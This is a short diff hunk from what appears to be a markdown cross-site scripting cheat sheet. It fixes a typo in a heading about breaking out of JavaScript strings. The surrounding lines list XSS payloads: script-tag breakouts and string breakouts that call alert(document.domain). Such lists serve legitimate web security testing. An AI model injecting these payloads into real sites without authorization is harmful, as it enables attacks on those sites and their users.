@@ -18,7 +18,7 @@
 `</script><img src=1 onerror=alert(document.domain)>`  
 `</script><script>alert(1)</script>`
 
-### Brak out of javascript string
+### Back out of javascript string
 
 `'-alert(document.domain)-'`  
 `'+alert(document.domain)+'`  
